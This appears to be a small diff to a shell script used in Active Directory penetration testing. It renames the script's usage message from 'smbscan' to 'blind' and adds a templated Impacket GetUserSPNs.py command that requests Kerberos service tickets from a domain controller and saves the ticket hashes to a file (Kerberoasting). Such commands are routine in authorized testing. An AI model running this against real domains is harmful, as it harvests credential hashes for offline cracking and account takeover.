@@ -10,6 +10,7 @@ if [ $# -eq 0 ]
 fi
 
 echo ""
-echo "Syntax: smbscan 'DC IP address'" 
-echo "Example: ./smbscan.sh 10.10.10.10"
+echo "Syntax: blind 'DC IP address'" 
+echo "Example: ./blind.sh 10.10.10.10"
 echo " "
+GetUserSPNs.py -request -dc-ip <Domain_Controller_IP> <Domain>/<Username>[:<Password>] -outputfile <output_file_for_hashes>
